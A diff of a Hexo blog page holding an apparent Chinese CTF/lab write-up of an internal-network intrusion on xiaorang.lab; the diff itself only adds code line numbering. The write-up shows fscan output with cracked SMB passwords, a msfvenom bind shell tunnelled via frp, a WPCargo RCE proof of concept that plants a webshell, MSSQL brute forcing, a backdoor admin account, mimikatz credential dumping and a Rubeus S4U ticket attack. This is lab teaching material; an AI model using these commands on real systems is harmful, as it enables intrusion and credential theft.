@@ -52,7 +52,8 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
 <body>
@@ -426,7 +427,7 @@
 <p>我使用的是<code>Redis Rogue Server</code></p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210942079.png" alt="image-20250721094256000"></p>
 <p>另一个端口开监听，使用python开个终端</p>
-<pre class=" language-highlight bash">python -c <span class="string"><code class="language-highlight bash">python -c <span class="string">&#x27;import pty; pty.spawn("/bin/bash")&#x27;</span></code></pre>
+<pre class="line-numbers language-highlight bash">python -c <span class="string"><code class="language-highlight bash">python -c <span class="string">&#x27;import pty; pty.spawn("/bin/bash")&#x27;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507210944645.png" alt="image-20250721094403618"></p>
 <p>找到flag，但是权限不够</p>
@@ -441,7 +442,7 @@
 <p>使用wget传fscan</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211010546.png" alt="image-20250721101001516"></p>
 <p>开扫</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">[2.8s] [*] 目标 172.22.2.16     存活 (ICMP)
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">[2.8s] [*] 目标 172.22.2.16     存活 (ICMP)
 [2.9s] [*] 目标 172.22.2.18     存活 (ICMP)
 [4.9s] [*] 目标 172.22.2.3      存活 (ICMP)
 [4.9s] [*] 目标 172.22.2.34     存活 (ICMP)
@@ -518,51 +519,51 @@
 [12.0s]     SMB2共享信息 172.22.2.16:445 admin Pass:admin123 共享:[ADMIN$ C$ fileshare IPC$]
 [12.0s]     SMB2共享信息 172.22.2.16:445 admin Pass:root 共享:[ADMIN$ C$ fileshare IPC$]
 [15.4s] [*] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
-[55.3s]     扫描已完成: 37/37</code></pre>
+[55.3s]     扫描已完成: 37/37<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>我们先挂个代理，然后使用msf连接shell</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211047250.png" alt="image-20250721104722212"></p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">┌────────┐        ┌────────────┐        ┌──────────────┐
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">┌────────┐        ┌────────────┐        ┌──────────────┐
 │ Kali   │ <--->  │ VPS 	   │ <--->  │   目标机器     │
 └────────┘        └────────────┘        └──────────────┘
         proxychains         frp（中转）        目标内网资源
-</code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>先使用msf生成shell马</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">msfvenom -p linux/x64/shell/bind_tcp -f elf -o shell.elf</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">msfvenom -p linux/x64/shell/bind_tcp -f elf -o shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后在目标机器上传frpc和刚才生成的马。 </p>
 <p>目标机器运行</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">nohup ./frpc -c  frpc.ini & 
-./shell.elf</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">nohup ./frpc -c  frpc.ini & 
+./shell.elf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211117922.png" alt="image-20250721111752893"></p>
 <p>在自己的vps上运行</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">./frps -c frps.ini</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">./frps -c frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211120986.png" alt="image-20250721112050957"></p>
 <p>最后在kail上运行</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">proxychains4 msfconsole
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">proxychains4 msfconsole
 use exploit/multi/handler
 set payload linux/x64/shell/bind_tcp
 set rhost 172.22.2.7
-run</code></pre>
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211122685.png" alt="image-20250721112214652"></p>
 <p>成功连接shell</p>
 <p>然后看一下我们扫描出来的ip，总结一下</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">172.22.2.7  本机
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">172.22.2.7  本机
 172.22.2.18 WordPress站点
 172.22.2.3  DC
 172.22.2.16 MSSQLSERVER 
-172.22.2.34 远程桌面服务未启用 NLA 的主机</code></pre>
+172.22.2.34 远程桌面服务未启用 NLA 的主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>访问wordpress</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211128214.png" alt="image-20250721112813158"></p>
 <p>代理已经成功挂上，使用别的扫描工具进行漏扫，这里使用的是wpscan</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211133941.png" alt="image-20250721113327907"></p>
 <p>这里显示版本为六点几，使用WPCargo &lt; 6.9.0的RCE漏洞，poc：</p>
-<pre class=" language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> sys
+<pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> sys
 <span class="keyword">import</span> binascii
 <span class="keyword">import</span> requests
  
@@ -586,7 +587,7 @@ requests.get(
 <span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span>
 <span class="built_in">print</span>(requests.post(
     <span class="string">f"<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system"</span>, data=&#123;<span class="string">"2"</span>: cmd&#125;
-).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</code></pre>
+).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211135850.png" alt="image-20250721113551773"></p>
 <p>写入webshell，使用蚁剑连接，咱们先给蚁剑配置代理</p>
@@ -594,7 +595,7 @@ requests.get(
 <p>然后连接webshell</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211432986.png" alt="image-20250721143237949"></p>
 <p>我们可以在其配置文件中找到数据库的账号密码</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">wpuser/WpuserEha8Fgj9</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">wpuser/WpuserEha8Fgj9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>直接在蚁剑处连接数据库（注意，这里host一定要写localhost，写它主机ip数据库会出错）</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211444602.png" alt="image-20250721144441551"></p>
@@ -604,17 +605,17 @@ requests.get(
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211531844.png" alt="image-20250721153157785"></p>
 <p>还记得我们刚开始fscan扫出来的信息吗，在<code>172.22.2.16</code>ip开放了1433端口，这是个mssql数据库，尝试爆破密码，就用我们导出来的密码本</p>
 <p>使用msf爆破</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">proxychains4 msfconsole
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">proxychains4 msfconsole
 use auxiliary/scanner/mssql/mssql_login
 set RHOSTS 172.22.2.16
 set user_file /root/Desktop/user.txt 
-set pass_file /root/Desktop/pass.txt</code></pre>
+set pass_file /root/Desktop/pass.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211539174.png" alt="image-20250721153921142"></p>
 <p>然后成功爆破出管理员的密码 sa&#x2F;ElGNkOiC</p>
 <p>使用MDUT连接，因为我前面在vps上挂了代理，这里直接调用就好了</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">
-E:\bili_download\Multiple.Database.Utilization.Tools-2.1.1>E:\java8\bin\java.exe -DsocksProxyHost=vps的IP -DsocksProxyPort=6000 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">
+E:\bili_download\Multiple.Database.Utilization.Tools-2.1.1>E:\java8\bin\java.exe -DsocksProxyHost=vps的IP -DsocksProxyPort=6000 -jar Multiple.Database.Utilization.Tools-2.1.1-jar-with-dependencies.jar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211625532.png" alt="image-20250721162538467"></p>
 <p>然后成功连接，命令执行</p>
@@ -626,8 +627,8 @@ E:\bili_download\Multiple.Database.Utilization.Tools-2.1.1>E:\java8\bin\java.exe
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211640157.png" alt="image-20250721164036114"></p>
 <h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>然后3389连接</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211641432.png" alt="image-20250721164158379"></p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">net user yyb Admin@123 /add
-net localgroup administrators yyb /add</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">net user yyb Admin@123 /add
+net localgroup administrators yyb /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>然后我是挂的proxifier代理在本机连接的</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211712498.png" alt="image-20250721171237146"></p>
@@ -635,23 +636,23 @@ net localgroup administrators yyb /add</code></pre>
 <p>ipconfig &#x2F;all发现域环境</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211724711.png" alt="image-20250721172444668"></p>
 <p>传mimikatz然后抓密码</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">privilege::debug
-sekurlsa::logonpasswords</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">privilege::debug
+sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>成功抓到一个域用户的哈希</p>
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211728210.png" alt="image-20250721172849175"></p>
 <p>只找到一个域用户，那就没有什么能用的，尝试委派攻击</p>
 <p>传rubeus搞一个TGT票据</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f414d4a5879e2b18dff531d85236b214 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > 1.txt</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:f414d4a5879e2b18dff531d85236b214 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211732729.png" alt="image-20250721173242678"></p>
 <p>然后把票据注入内存</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3D1qJxagrnyNB6lRLLLimOvJSWEFk5QwMdTe88MQzI6GSIrsq6xnWWn5qFKWEOcynwoFlBWPce1uzZ1vqhn0ytxUwse5y47oDaBrVgdkTJGD8MmRRtp8ih2arsBsmeJ1MxWa/T/gt14kG6MhwRAKuzgOFA+KAz3Yvg56FDEQk4m/ApPnbvafBZnZ4x9OJfRFY2MY7lzMNzi+XoHCO62FMx7lqkW2agd3gNO3FCyBMKyZUsf/o5hj/pJ1jb5xHesGS5nPP9ljpquFqfzJhQoSDR2RZwF2mZV586BsCbAKgeulb6rOoEXSaXv1zDEiELDarVJ46OZXtGvIq8dzZz2NFWOMi2kCQN2jRUTGZf3C1QrnBa41XC7IkQyj/m25ZS+fAzjbDWC2VU4x1lY7Goizi4zyzI6wBnrtJsOpARztofMCxplHD9GO8Wxxobk9amVAVrHz+0MMpPkUajgVbPyyTbnGcCLGe+4iJNomDJ1M1VO1uKZsWqlwYJB9W84yyl5wNxh2r+2enOoHdRwHYtN0VygvmPXisgW87ypnWk1z62qi4mQgtbHSqn37CkewUoh8aRayxA/FHEtX3OExCvqUC1EwatgxFvpAyFCkYQrZVcaVy22FNKNUsLSAXRU+PdGMZVsyPX8g8nNMaG6HGjITJFd9JUtEBEzT6MNDOlwcmHWWtFrh45tbyZ6Tb3eoZfDG+ePaAN/1KHt/z0uogbsUbBVxBFEJ7jMFKGo9tJ9F/i5TZmu18XrHK+YTA5RCaQbpqGHL5ZestM1qASOMt/U9a0jFJ7Qc3UH5xpmEG/gJGy0bvwrq/5DmxlPwns51FxyHnpV2/2ivoG8KlhDQ+7ZsReeDR/Yx4b/ltm78MFb3sYDNoZNRmIkmtlUr/hhtgjxAml5mSmYHuK2a7LDo5EKLhwQvVwfi655EP/8XpeAOwOX214xR7xx3ytXIjP0H4TfCdB3/M53aEIGDyewiDdSdoZSTXCT1uzbXhzYEorSZTjvyj5/c569lpzZANm+pu9wxqEZR3KuR6M6Gua5JOXvB7zTMVziO6432zM/QylaUQTTIvVB6ho0s1LYAlhrzm9CDSN0qbxSKNMRyk9cY6LBLhMk/QyhH21W7v26NaxlyOPZiG/2iXPXghieZUyuj41N4U+OjeIZFQapqhNgVicCp1XZ2u5r+DXWGqEaAf6zmRtGpT/c6XI7e+eM2PQV34QppPU+yxmjIDZcYwfrHV4QEZHoTFBY37YkqnVZ0AvfMVm6nCUXjtz3Zfairq5vONGmMsrU8r/G1Ezy63zpbsb7WpRV0MgJW8jp1Bhb1w3RjENHaRhffHf77DSYrG5sbW9Y6q9/tX5dafNz0f4Sjs+cky8LtVebObTBYX5VSmme4QxvRdnN6FfDJKS53WkediaLcoMMZZclW3imwJ29fPVIYd3s83/HANG+csokt1PcdaUYm4EZ2bF+0Orog5xGqCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBB53vQ2rhdsQEfSvz0rI5SHoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDcyMTA5MzIxNVqmERgPMjAyNTA3MjExOTMyMTVapxEYDzIwMjUwNzI4MDkzMjE1WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE3D1qJxagrnyNB6lRLLLimOvJSWEFk5QwMdTe88MQzI6GSIrsq6xnWWn5qFKWEOcynwoFlBWPce1uzZ1vqhn0ytxUwse5y47oDaBrVgdkTJGD8MmRRtp8ih2arsBsmeJ1MxWa/T/gt14kG6MhwRAKuzgOFA+KAz3Yvg56FDEQk4m/ApPnbvafBZnZ4x9OJfRFY2MY7lzMNzi+XoHCO62FMx7lqkW2agd3gNO3FCyBMKyZUsf/o5hj/pJ1jb5xHesGS5nPP9ljpquFqfzJhQoSDR2RZwF2mZV586BsCbAKgeulb6rOoEXSaXv1zDEiELDarVJ46OZXtGvIq8dzZz2NFWOMi2kCQN2jRUTGZf3C1QrnBa41XC7IkQyj/m25ZS+fAzjbDWC2VU4x1lY7Goizi4zyzI6wBnrtJsOpARztofMCxplHD9GO8Wxxobk9amVAVrHz+0MMpPkUajgVbPyyTbnGcCLGe+4iJNomDJ1M1VO1uKZsWqlwYJB9W84yyl5wNxh2r+2enOoHdRwHYtN0VygvmPXisgW87ypnWk1z62qi4mQgtbHSqn37CkewUoh8aRayxA/FHEtX3OExCvqUC1EwatgxFvpAyFCkYQrZVcaVy22FNKNUsLSAXRU+PdGMZVsyPX8g8nNMaG6HGjITJFd9JUtEBEzT6MNDOlwcmHWWtFrh45tbyZ6Tb3eoZfDG+ePaAN/1KHt/z0uogbsUbBVxBFEJ7jMFKGo9tJ9F/i5TZmu18XrHK+YTA5RCaQbpqGHL5ZestM1qASOMt/U9a0jFJ7Qc3UH5xpmEG/gJGy0bvwrq/5DmxlPwns51FxyHnpV2/2ivoG8KlhDQ+7ZsReeDR/Yx4b/ltm78MFb3sYDNoZNRmIkmtlUr/hhtgjxAml5mSmYHuK2a7LDo5EKLhwQvVwfi655EP/8XpeAOwOX214xR7xx3ytXIjP0H4TfCdB3/M53aEIGDyewiDdSdoZSTXCT1uzbXhzYEorSZTjvyj5/c569lpzZANm+pu9wxqEZR3KuR6M6Gua5JOXvB7zTMVziO6432zM/QylaUQTTIvVB6ho0s1LYAlhrzm9CDSN0qbxSKNMRyk9cY6LBLhMk/QyhH21W7v26NaxlyOPZiG/2iXPXghieZUyuj41N4U+OjeIZFQapqhNgVicCp1XZ2u5r+DXWGqEaAf6zmRtGpT/c6XI7e+eM2PQV34QppPU+yxmjIDZcYwfrHV4QEZHoTFBY37YkqnVZ0AvfMVm6nCUXjtz3Zfairq5vONGmMsrU8r/G1Ezy63zpbsb7WpRV0MgJW8jp1Bhb1w3RjENHaRhffHf77DSYrG5sbW9Y6q9/tX5dafNz0f4Sjs+cky8LtVebObTBYX5VSmme4QxvRdnN6FfDJKS53WkediaLcoMMZZclW3imwJ29fPVIYd3s83/HANG+csokt1PcdaUYm4EZ2bF+0Orog5xGqCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBB53vQ2rhdsQEfSvz0rI5SHoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDcyMTA5MzIxNVqmERgPMjAyNTA3MjExOTMyMTVapxEYDzIwMjUwNzI4MDkzMjE1WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211734118.png" alt="image-20250721173414070"></p>
 <p>成功导入，尝试访问域控</p>
-<pre class=" language-highlight plaintext"><code class="language-highlight plaintext">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
-</code></pre>
+<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">type \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://raw.githubusercontent.com/Yyb0666/Picture-bed/img/img/202507211738984.png" alt="image-20250721173812952"></p>
 <p>成功拿下flag4</p>
